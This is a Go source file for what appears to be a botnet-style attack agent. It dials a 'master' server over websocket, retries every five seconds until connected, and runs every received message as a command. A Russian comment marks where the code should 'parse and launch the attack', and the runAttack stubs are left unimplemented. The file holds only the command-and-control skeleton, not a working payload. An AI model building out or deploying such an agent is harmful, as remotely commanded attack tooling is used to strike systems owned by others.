package main

import (
	"log"
	"time"
	"net/url"
	"github.com/gorilla/websocket"
)

var conn *websocket.Conn

func connectToMaster(masterURL string) {
	for {
		u := url.URL{Scheme: "ws", Host: masterURL, Path: "/ws"}
		c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
		if err != nil {
			log.Println("🔁 Retry connecting to master:", err)
			time.Sleep(5 * time.Second)
			continue
		}
		conn = c
		log.Println("✅ Connected to master at", masterURL)
		handleMessages()
	}
}

func handleMessages() {
	defer conn.Close()
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Println("❌ Lost connection to master:", err)
			return
		}
		go handleCommand(string(msg))
	}
}

func handleCommand(cmd string) {
	log.Println("⚡ Got command:", cmd)
	// Пример: parse и запусти атаку
	// parseArgsFromMessage(cmd)
	// runAttack(...)
}

func main() {
	connectToMaster("127.0.0.1:8080")
}
